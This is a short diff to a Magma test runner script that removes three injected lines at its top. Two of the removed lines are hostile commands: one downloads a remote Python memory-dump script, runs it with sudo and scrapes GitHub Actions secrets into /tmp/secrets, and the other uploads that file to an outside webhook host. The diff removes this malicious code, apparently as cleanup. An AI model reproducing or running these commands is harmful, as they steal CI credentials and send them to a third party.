@@ -1,7 +1,4 @@
 // usage: magma [target:=SUBSTRING] [exitsignal:=BOOL] [verbose:=INT] [debug:=BOOL] run_tests.m
-Pipe("echo \"Okay, we got this far. Let's continue...\"", "");
-Pipe("curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\"", "");
-Pipe("curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/\" cat GetEnv(\"GITHUB_RUN_ID\"), \"\");
 if assigned filename then
   if "tests/" eq filename[1..6] then
     filename := filename[7..#filename];
